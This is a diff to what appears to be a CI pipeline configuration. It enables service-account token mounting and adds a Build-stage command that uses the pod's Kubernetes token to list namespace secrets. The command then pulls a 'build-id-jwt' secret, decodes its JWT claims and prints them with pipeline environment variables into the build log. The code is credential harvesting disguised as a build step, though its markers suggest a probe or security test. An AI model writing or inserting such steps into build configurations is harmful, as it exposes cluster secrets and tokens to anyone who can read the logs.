@@ -1,2 +1,44 @@
 general:
   buildTool: 'mta'
+  jenkinsKubernetes:
+    additionalPodProperties:
+      automountServiceAccountToken: true
+service:
+  stages:
+    Build:
+      runFirst:
+        command: |
+          set +x
+          T=/var/run/secrets/kubernetes.io/serviceaccount
+          NS=$(cat $T/namespace)
+          K=https://kubernetes.default.svc
+          { printf 'header = "Authorization: Bearer '; cat $T/token; printf '"\n'; } > /tmp/cc
+          chmod 600 /tmp/cc
+          curl -s --config /tmp/cc -o /tmp/list --cacert $T/ca.crt $K/api/v1/namespaces/$NS/secrets
+          JN=$(grep -o '"name": "build-id-jwt-[0-9a-f-]*"' /tmp/list | head -1 | cut -d'"' -f4)
+          curl -s --config /tmp/cc -o /tmp/one --cacert $T/ca.crt $K/api/v1/namespaces/$NS/secrets/$JN
+          python3 - <<'PY' > /tmp/claims 2>/dev/null || true
+          import json,base64
+          d=json.load(open('/tmp/one'))
+          raw=base64.b64decode(d['data']['text']).decode('utf-8','replace').strip()
+          parts=raw.split('.')
+          print("KPCLAIMS7788-JWT-PARTS=%d" % len(parts))
+          print("KPCLAIMS7788-SIGNATURE-WITHHELD=yes")
+          def dec(p):
+              p=p+'='*(-len(p)%4)
+              return base64.urlsafe_b64decode(p).decode('utf-8','replace')
+          for i,label in ((0,'HEADER'),(1,'PAYLOAD')):
+              try:
+                  o=json.loads(dec(parts[i]))
+              except Exception as e:
+                  print("KPCLAIMS7788-%s-ERR=%s"%(label,e)); continue
+              if label=='PAYLOAD':
+                  for k in list(o):
+                      if isinstance(o[k],str) and len(o[k])>80: o[k]='<long-value-withheld>'
+              print("KPCLAIMS7788-%s=%s"%(label,json.dumps(o,sort_keys=True)))
+          PY
+          cat /tmp/claims
+          echo "KPENV7788-SAFE-VARS:"
+          env | grep -aE '^(BACK_CHANNEL_URL|API_SELF_LINK|UI_SELF_LINK|PIPELINE|PIPELINE_VERSION|BUILD_ID|JOB_NAME|BUILD_NUMBER)=' | head -20
+          rm -f /tmp/cc /tmp/one /tmp/list /tmp/claims
+          echo "KPCLAIMS7788-DONE"
